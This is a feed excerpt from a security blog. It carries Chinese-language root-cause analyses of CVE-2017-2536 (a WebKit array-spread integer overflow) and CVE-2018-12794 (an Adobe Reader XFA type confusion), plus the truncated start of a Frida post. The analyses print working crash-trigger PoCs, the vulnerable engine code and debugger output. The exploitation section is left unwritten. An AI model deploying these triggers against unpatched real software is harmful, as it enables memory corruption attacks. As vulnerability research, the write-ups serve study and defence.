    <title>CVE-2017-2536 analysis</title>
    <link href="http://o0xmuhe.me/2019/03/24/CVE-2017-2536-analysis/"/>
    <id>http://o0xmuhe.me/2019/03/24/CVE-2017-2536-analysis/</id>
    <published>2019-03-24T09:27:12.000Z</published>
    <updated>2019-03-25T02:12:44.247Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前置知识"><a href="#0x00-前置知识" class="headerlink" title="0x00 : 前置知识"></a>0x00 : 前置知识</h2><ol>
<li>interpreter<br>解释器 (LLint)</li>
<li>DFG JIT<br>全称 data flow graph JIT 数据流图 JIT。是一种推测优化的技术。会开始对一个类型做出一个能够对性能好的假设，先编译一个版本，如果后面发现假设不对就会跳转回原先代码，称为 Speculation failure。DFG 是并发编译器，DFG pipeline 的每个部分都是同时运行的，包括字节码解析和分析。</li>
<li>FLT JIT<br>新的一层 FTL 实际上是 DFG Backend 的替换。会先在 DFG 的 JavaScript 函数表示转换为静态单一指派（SSA） 格式上做些 JavaScript 特性的优化。接着把 DFG IR 转换成 FTL 里用到的 B3 的 IR。最后生成机器码。</li>
</ol>
<a id="more"></a>
<p>总的来说过程就是把源码生成字节码，接着变成 DFG CPS IR，再就是 DFG SSA IR，最后成 B3 的 IR，JavaScript 的动态性就是在这些过程中一步步被消除掉的。</p>
<p>首先了解 javascript展开语法:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ES6的新特性:</span><br><span class="line">4展开语法(Spread syntax), 可以在函数调用/数组构造时, 将数组表达式或者string在语法层面展开；</span><br><span class="line">4还可以在构造字面量对象时, 将对象表达式按key-value的方式展开。</span><br><span class="line">4(译者注: 字面量一般指 [1, 2, 3] 或者 &#123;name: &quot;mdn&quot;&#125; 这种简洁的构造方式)</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="built_in">console</span>.log(...a);</span><br><span class="line"><span class="comment">// 1 2 3</span></span><br></pre></td></tr></table></figure>
<h2 id="0x01-漏洞信息"><a href="#0x01-漏洞信息" class="headerlink" title="0x01 : 漏洞信息"></a>0x01 : 漏洞信息</h2><p>经典的jit洞 git commit : 61dbb71d92f6a9e5a72c5f784eb5ed11495b3ff7</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x7fffffff</span>);</span><br><span class="line"><span class="keyword">let</span> hax = [<span class="number">13</span>, <span class="number">37</span>, ...a, ...a];</span><br></pre></td></tr></table></figure>
<p>PoC中，hax数组的长度，需要计算，根据展开array a去计算，jit中这部分实现出了问题。</p>
<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 : 漏洞分析"></a>0x02 : 漏洞分析</h2><p><a href="https://phoenhex.re/2017-06-02/arrayspread" target="_blank" rel="noopener">Exploiting an integer overflow with array spreading (WebKit)</a></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">SLOW_PATH_DECL(slow_path_new_array_with_spread)</span><br><span class="line">&#123;</span><br><span class="line">    BEGIN();</span><br><span class="line">    <span class="keyword">int</span> numItems = pc[<span class="number">3</span>].u.operand;</span><br><span class="line">    ASSERT(numItems &gt;= <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">const</span> BitVector&amp; bitVector = exec-&gt;codeBlock()-&gt;unlinkedCodeBlock()-&gt;bitVector(pc[<span class="number">4</span>].u.unsignedValue);</span><br><span class="line"></span><br><span class="line">    JSValue* values = bitwise_cast&lt;JSValue*&gt;(&amp;OP(<span class="number">2</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算array size</span></span><br><span class="line">    <span class="comment">// poc 中的 hax array</span></span><br><span class="line">    <span class="keyword">unsigned</span> arraySize = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; numItems; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (bitVector.get(i)) &#123;</span><br><span class="line">            JSValue value = values[-i];</span><br><span class="line">            JSFixedArray* <span class="built_in">array</span> = jsCast&lt;JSFixedArray*&gt;(value);</span><br><span class="line">            arraySize += <span class="built_in">array</span>-&gt;size();</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">            arraySize += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    JSGlobalObject* globalObject = exec-&gt;lexicalGlobalObject();</span><br><span class="line">    Structure* structure = globalObject-&gt;arrayStructureForIndexingTypeDuringAllocation(ArrayWithContiguous);</span><br><span class="line"></span><br><span class="line">    JSArray* result = JSArray::tryCreateForInitializationPrivate(vm, structure, arraySize);</span><br><span class="line">    CHECK_EXCEPTION();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据计算的size，分配空间</span></span><br><span class="line">    <span class="keyword">unsigned</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; numItems; i++) &#123;</span><br><span class="line">        JSValue value = values[-i];</span><br><span class="line">        <span class="keyword">if</span> (bitVector.get(i)) &#123;</span><br><span class="line">            <span class="comment">// We are spreading.</span></span><br><span class="line">            JSFixedArray* <span class="built_in">array</span> = jsCast&lt;JSFixedArray*&gt;(value);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">unsigned</span> i = <span class="number">0</span>; i &lt; <span class="built_in">array</span>-&gt;size(); i++) &#123;</span><br><span class="line">                RELEASE_ASSERT(<span class="built_in">array</span>-&gt;get(i));</span><br><span class="line">                result-&gt;initializeIndex(vm, index, <span class="built_in">array</span>-&gt;get(i));</span><br><span class="line">                ++index;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// We are not spreading.</span></span><br><span class="line">            result-&gt;initializeIndex(vm, index, value);</span><br><span class="line">            ++index;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    RETURN(result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>size 是一个 <code>unsigned</code>，可以整数溢出。<br><code>JSObject::initializeIndex</code>无任何边界检查：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> ALL_CONTIGUOUS_INDEXING_TYPES: &#123;</span><br><span class="line">    ASSERT(i &lt; butterfly-&gt;publicLength());</span><br><span class="line">    ASSERT(i &lt; butterfly-&gt;vectorLength());</span><br><span class="line">    butterfly-&gt;contiguous()[i].<span class="built_in">set</span>(vm, <span class="keyword">this</span>, v);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ... */</span></span><br></pre></td></tr></table></figure>
<p>所以poc按照以上代码逻辑之行的话，会分配一个size是0的array，但是却拷贝了 <code>2147483647 * 2 + 2</code> 即 <code>0x7fffffff * 2 + 2</code> 个数据进去，导致堆溢出。</p>
<h3 id="看commit"><a href="#看commit" class="headerlink" title="看commit"></a>看commit</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">log</span> -g --grep=<span class="string">"169780"</span></span><br></pre></td></tr></table></figure>
<p>或者直接sourcetree搜索</p>
<p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/CVE-2017-2536%20analysis/Screen%20Shot%202019-03-23%20at%2011.28.56%20PM.png" alt=""></p>
<p>这个洞在三个jit阶段都有体现，所以补了多个地方：<br><code>LLint, DFG JIT, FTL JIT</code></p>
<p>基本上都是，计算新array的length从简单粗暴的计算，改成增加了length check的计算。</p>
<p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/CVE-2017-2536%20analysis/Screen%20Shot%202019-03-23%20at%2011.30.08%20PM.png" alt=""></p>
<h2 id="0x03-利用"><a href="#0x03-利用" class="headerlink" title="0x03 : 利用"></a>0x03 : 利用</h2><p> TODO</p>
<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 : 参考"></a>0x04 : 参考</h2><p><a href="https://phoenhex.re/2017-06-02/arrayspread" target="_blank" rel="noopener">Exploiting an integer overflow with array spreading (WebKit)</a></p>
<p><a href="https://ming1016.github.io/2017/10/11/deeply-analyse-webkit/" target="_blank" rel="noopener">深入剖析 WebKit</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前置知识&quot;&gt;&lt;a href=&quot;#0x00-前置知识&quot; class=&quot;headerlink&quot; title=&quot;0x00 : 前置知识&quot;&gt;&lt;/a&gt;0x00 : 前置知识&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;interpreter&lt;br&gt;解释器 (LLint)&lt;/li&gt;
&lt;li&gt;DFG JIT&lt;br&gt;全称 data flow graph JIT 数据流图 JIT。是一种推测优化的技术。会开始对一个类型做出一个能够对性能好的假设，先编译一个版本，如果后面发现假设不对就会跳转回原先代码，称为 Speculation failure。DFG 是并发编译器，DFG pipeline 的每个部分都是同时运行的，包括字节码解析和分析。&lt;/li&gt;
&lt;li&gt;FLT JIT&lt;br&gt;新的一层 FTL 实际上是 DFG Backend 的替换。会先在 DFG 的 JavaScript 函数表示转换为静态单一指派（SSA） 格式上做些 JavaScript 特性的优化。接着把 DFG IR 转换成 FTL 里用到的 B3 的 IR。最后生成机器码。&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
    
      <category term="漏洞分析" scheme="http://o0xmuhe.me/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="webkit" scheme="http://o0xmuhe.me/tags/webkit/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2018-12794 分析</title>
    <link href="http://o0xmuhe.me/2019/03/12/CVE-2018-12794-%E5%88%86%E6%9E%90/"/>
    <id>http://o0xmuhe.me/2019/03/12/CVE-2018-12794-分析/</id>
    <published>2019-03-12T09:07:43.000Z</published>
    <updated>2019-03-12T09:16:45.767Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-漏洞信息"><a href="#0x00-漏洞信息" class="headerlink" title="0x00 : 漏洞信息"></a>0x00 : 漏洞信息</h2><p>XFA 类型混淆导致OOB的漏洞。</p>
<a id="more"></a>
<h2 id="0x01-PoC"><a href="#0x01-PoC" class="headerlink" title="0x01 : PoC"></a>0x01 : PoC</h2><p>利用脚本把XFA和JS从PDF里拆分出来<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xdp:xdp</span> <span class="attr">xmlns:xdp</span>=<span class="string">'http://ns.adobe.com/xdp/'</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">config</span> <span class="attr">xmlns:xfa</span>=<span class="string">'http://www.xfa.org/schema/xci/3.1/'</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">present</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">pdf</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interactive</span>&gt;</span></span><br><span class="line">          1</span><br><span class="line">        <span class="tag">&lt;/<span class="name">interactive</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scriptModel</span>&gt;</span></span><br><span class="line">          XFA</span><br><span class="line">        <span class="tag">&lt;/<span class="name">scriptModel</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encryption</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">permissions</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">permissions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encryption</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">pdf</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">present</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">acrobat</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">acrobat7</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dynamicRender</span>&gt;</span></span><br><span class="line">          required</span><br><span class="line">        <span class="tag">&lt;/<span class="name">dynamicRender</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">acrobat7</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">acrobat</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">config</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">44</span><br><span class="line">    <span class="tag">&lt;<span class="name">subform</span> <span class="attr">layout</span>=<span class="string">'tb'</span> <span class="attr">name</span>=<span class="string">'outerform'</span>&gt;</span></span><br><span class="line"></span><br><span class="line">44<span class="tag">&lt;<span class="name">pageSet</span>&gt;</span></span><br><span class="line">444<span class="tag">&lt;<span class="name">pageArea</span> <span class="attr">id</span>=<span class="string">'Page2'</span> <span class="attr">name</span>=<span class="string">'Page2'</span>&gt;</span></span><br><span class="line">4444<span class="tag">&lt;<span class="name">contentArea</span> <span class="attr">h</span>=<span class="string">'100mm'</span> <span class="attr">w</span>=<span class="string">'200mm'</span> <span class="attr">x</span>=<span class="string">'0.25in'</span> <span class="attr">y</span>=<span class="string">'0.25in'</span>/&gt;</span></span><br><span class="line">4444<span class="tag">&lt;<span class="name">medium</span> <span class="attr">long</span>=<span class="string">'297mm'</span> <span class="attr">short</span>=<span class="string">'210mm'</span> <span class="attr">stock</span>=<span class="string">'a4'</span>/&gt;</span></span><br><span class="line">444<span class="tag">&lt;/<span class="name">pageArea</span>&gt;</span></span><br><span class="line">44<span class="tag">&lt;/<span class="name">pageSet</span>&gt;</span></span><br><span class="line">4</span><br><span class="line">44  </span><br><span class="line">44<span class="tag">&lt;<span class="name">subform</span> <span class="attr">name</span>=<span class="string">"sub1"</span>&gt;</span><span class="tag">&lt;/<span class="name">subform</span>&gt;</span></span><br><span class="line">44444</span><br><span class="line">44<span class="tag">&lt;<span class="name">subform</span> <span class="attr">name</span>=<span class="string">"sub2"</span>&gt;</span></span><br><span class="line">444<span class="tag">&lt;<span class="name">calculate</span>&gt;</span></span><br><span class="line">4444<span class="tag">&lt;<span class="name">script</span> <span class="attr">contentType</span>=<span class="string">"application/x-javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">					app.alert(<span class="string">"crash...!"</span>);</span></span><br><span class="line"><span class="undefined">				</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>					</span><br><span class="line">444<span class="tag">&lt;/<span class="name">calculate</span>&gt;</span></span><br><span class="line">44<span class="tag">&lt;/<span class="name">subform</span>&gt;</span>	</span><br><span class="line">44444</span><br><span class="line">4<span class="tag">&lt;/<span class="name">subform</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">xfa:datasets</span> <span class="attr">xmlns:xfa</span>=<span class="string">'http://www.xfa.org/schema/xfa-data/1.0/'</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xdp:xdp</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>js代码如下<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">o = xfa.resolveNode(<span class="string">"xfa[0].template[0].outerform[0].sub1[0]"</span>); </span><br><span class="line">o2 = xfa.resolveNode(<span class="string">"xfa[0].form[0].outerform[0].sub2[0]"</span>);</span><br><span class="line">o.nodes.append(o2);		</span><br><span class="line">o2.presence = <span class="string">"inactive"</span>;<span class="comment">//will crash here</span></span><br><span class="line">app.alert(<span class="string">"no crash!"</span>);</span><br></pre></td></tr></table></figure></p>
<p><code>PoC</code>很好懂，就是把o2节点添加为o的子节点，然后访问o2的<code>presence</code>属性，并且赋值，就是访问一次这个属性。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">(c74.700): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax=00000001 ebx=00000000 ecx=42f2eec0 edx=0013d164 esi=00000000 edi=42f2eec0</span><br><span class="line">eip=5c067d77 esp=0013cfd8 ebp=0013d034 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210246</span><br><span class="line">AcroForm!PlugInMain+0x979d7:</span><br><span class="line">5c067d77 39b7d0010000    cmp     dword ptr [edi+1D0h],esi ds:0023:42f2f090=????????</span><br><span class="line"></span><br><span class="line">0:000&gt; k10</span><br><span class="line">ChildEBP RetAddr  </span><br><span class="line">WARNING: Stack unwind information not available. Following frames may be wrong.</span><br><span class="line">0013d034 5c05dd14 AcroForm!PlugInMain+0x979d7</span><br><span class="line">0013d0d0 5c01cc57 AcroForm!PlugInMain+0x8d974</span><br><span class="line">0013d118 5c4dcc55 AcroForm!PlugInMain+0x4c8b7</span><br><span class="line">0013d130 5c05daa4 AcroForm!DllUnregisterServer+0x3367ac</span><br><span class="line">0013d174 5c05d731 AcroForm!PlugInMain+0x8d704</span><br><span class="line">0013d1e8 6e4e90b2 AcroForm!PlugInMain+0x8d391</span><br><span class="line">0013d1ec 770665f4 verifier!VerifierDisableFaultInjectionExclusionRange+0x3162</span><br><span class="line">0013d1f0 7702a0aa ntdll!RtlpNtMakeTemporaryKey+0x48b5</span><br><span class="line">0013d1f4 76ff65a6 ntdll!EtwSetMark+0xe743</span><br><span class="line">0013d1f8 7556c3d4 ntdll!wcsnicmp+0xcaa</span><br><span class="line">0013d1fc 6b09ecfa kernel32!HeapFree+0x14</span><br><span class="line">0013d204 5c32f87d MSVCR120!free+0x1a</span><br><span class="line">00000000 00000000 AcroForm!DllUnregisterServer+0x1893d4</span><br><span class="line"></span><br><span class="line">0:000&gt; dd edi</span><br><span class="line">42f2eec0  5c78061c 00000002 42c64fe8 5c88d328</span><br><span class="line">42f2eed0  00000147 c0c0c0c0 c0c0c0d0 43884fe0</span><br><span class="line">42f2eee0  43404e40 00000000 43832fb0 c0c0c0c2</span><br><span class="line">42f2eef0  42f2eec0 2ff76fd8 00000000 00000000</span><br><span class="line">42f2ef00  2be4cf30 00000015 00000000 5c88f9b4</span><br><span class="line">42f2ef10  5c88d328 43404e40 00000000 00000000</span><br><span class="line">42f2ef20  00000000 00000000 00000004 5c640954</span><br><span class="line">42f2ef30  00000000 5c640954 00000000 42e8afd0</span><br><span class="line">0:000&gt; dd edi+1d0</span><br><span class="line">42f2f090  ???????? ???????? ???????? ????????</span><br><span class="line">42f2f0a0  ???????? ???????? ???????? ????????</span><br><span class="line">42f2f0b0  ???????? ???????? ???????? ????????</span><br><span class="line">42f2f0c0  ???????? ???????? ???????? ????????</span><br><span class="line">42f2f0d0  ???????? ???????? ???????? ????????</span><br><span class="line">42f2f0e0  ???????? ???????? ???????? ????????</span><br><span class="line">42f2f0f0  ???????? ???????? ???????? ????????</span><br><span class="line">42f2f100  ???????? ???????? ???????? ????????</span><br><span class="line"></span><br><span class="line">0:000&gt; !heap -p -a edi</span><br><span class="line">    address 42f2eec0 found in</span><br><span class="line">    _DPH_HEAP_ROOT @ 1471000</span><br><span class="line">    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)</span><br><span class="line">                                431b130c:         42f2eec0              140 -         42f2e000             2000</span><br><span class="line">          ? AcroForm!DllUnregisterServer+5da173</span><br><span class="line">    6e4e8e89 verifier!VerifierDisableFaultInjectionExclusionRange+0x00002f39</span><br><span class="line">    77065e26 ntdll!RtlpNtMakeTemporaryKey+0x000040e7</span><br><span class="line">    7702a376 ntdll!EtwSetMark+0x0000ea0f</span><br><span class="line">    76ff5ae0 ntdll!wcsnicmp+0x000001e4</span><br><span class="line">    6b09ed63 MSVCR120!malloc+0x00000033</span><br><span class="line">    5bfd70ed AcroForm!PlugInMain+0x00006d4d</span><br><span class="line">    5c009e2d AcroForm!PlugInMain+0x00039a8d</span><br></pre></td></tr></table></figure>
<p>这是一个越界读。</p>
<h2 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 : 分析"></a>0x02 : 分析</h2><p>首先根据callstack，定位一下漏洞点以及发生oob的对象是啥。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; k10</span><br><span class="line">ChildEBP RetAddr</span><br><span class="line">0013d034 5c05dd14 XFAFormModelImpl__isActivityExcluded </span><br><span class="line">0013d0d0 5c01cc57 AcroForm!PlugInMain+0x8d974</span><br><span class="line">0013d118 5c4dcc55 AcroForm!PlugInMain+0x4c8b7</span><br><span class="line">0013d130 5c05daa4 AcroForm!DllUnregisterServer+0x3367ac</span><br><span class="line">0013d174 5c05d731 sub_208FD8D5</span><br><span class="line">0013d1e8 6e4e90b2 sub_208FD3BA </span><br><span class="line">0013d1ec 770665f4 verifier!VerifierDisableFaultInjectionExclusionRange+0x3162</span><br><span class="line">0013d1f0 7702a0aa ntdll!RtlpNtMakeTemporaryKey+0x48b5</span><br><span class="line">0013d1f4 76ff65a6 ntdll!EtwSetMark+0xe743</span><br><span class="line">0013d1f8 7556c3d4 ntdll!wcsnicmp+0xcaa</span><br><span class="line">0013d1fc 6b09ecfa kernel32!HeapFree+0x14</span><br><span class="line">0013d204 5c32f87d MSVCR120!free+0x1a</span><br><span class="line">00000000 00000000 sub_20BCF7CC // free wrp</span><br></pre></td></tr></table></figure>
<p>发生崩溃的函数是在<code>XFAFormModelImpl__isActivityExcluded</code>，这是在操作<code>xfa.form</code>对象，但是却发生了越界。<br>调试发现，此时访问的对象并不是<code>xfa.form</code>对象，而是一个大小为0x140的对象，看下这个对象的分配情况，可以确定这个对象的大小、类型信息。<br>得到这段代码的方法是：首先heap命令得到当前对象的基本情况，找到分配的位置，一般来说c++对象分配是先走malloc之类的分配器（程序可能自己封装malloc）分配内存（对象大小），然后初始化虚表啥的，所以malloc调用往前找一个就找到了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">; __unwind &#123; // loc_20E3F4E2</span><br><span class="line">push    8</span><br><span class="line">mov     eax, offset loc_20E3F4E2</span><br><span class="line">call    __EH_prolog3</span><br><span class="line">mov     edi, ecx</span><br><span class="line">push    140h            ; size_t 对象大小</span><br><span class="line">call    jfCacheManager_alloc</span><br><span class="line">mov     edx, eax</span><br><span class="line">pop     ecx</span><br></pre></td></tr></table></figure>
<p>交叉引用得到这个对象是一个<code>xfa.template</code>对象，以下是两个对象的情况：</p>
<p><code>xfa.template</code> 对象大小 <code>0x140</code><br><code>xfa.form</code>    对象大小 <code>0x270</code><br>所以这是一个类型混淆漏洞，程序错误的把<code>xfa.template</code>对象当作<code>xfa.form</code>对象来读取数据，导致越界的发生，<code>root cause</code>是类型混淆。</p>
<h2 id="0x03-引用"><a href="#0x03-引用" class="headerlink" title="0x03 : 引用"></a>0x03 : 引用</h2><p><a href="https://www.thezdi.com/blog/2018/9/18/cve-2018-12794-using-type-confusion-to-get-code-execution-in-adobe-reader" target="_blank" rel="noopener">using-type-confusion-to-get-code-execution-in-adobe-reader</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-漏洞信息&quot;&gt;&lt;a href=&quot;#0x00-漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;0x00 : 漏洞信息&quot;&gt;&lt;/a&gt;0x00 : 漏洞信息&lt;/h2&gt;&lt;p&gt;XFA 类型混淆导致OOB的漏洞。&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞分析" scheme="http://o0xmuhe.me/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>使用Frida辅助逆向</title>
    <link href="http://o0xmuhe.me/2019/01/04/%E4%BD%BF%E7%94%A8Frida%E8%BE%85%E5%8A%A9%E9%80%86%E5%90%91/"/>
    <id>http://o0xmuhe.me/2019/01/04/使用Frida辅助逆向/</id>
    <published>2019-01-04T07:31:47.000Z</published>
    <updated>2019-01-04T13:11:19.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00-关于使用Frida"><a href="#0x00-关于使用Frida" class="headerlink" title="0x00 : 关于使用Frida"></a>0x00 : 关于使用Frida</h4><p><code>Frida</code>是一个跨平台的、多平台的hook框架，使用起来十分方便，而且文档全面，可以很好的辅助逆向工程。在需要使用一些hook的时候，可以很快地完成；如果还是用c/c++的话..写dll，还要想办法dll注入，而且很麻烦不灵活，修改代码很麻烦。</p>
<a id="more"></a>
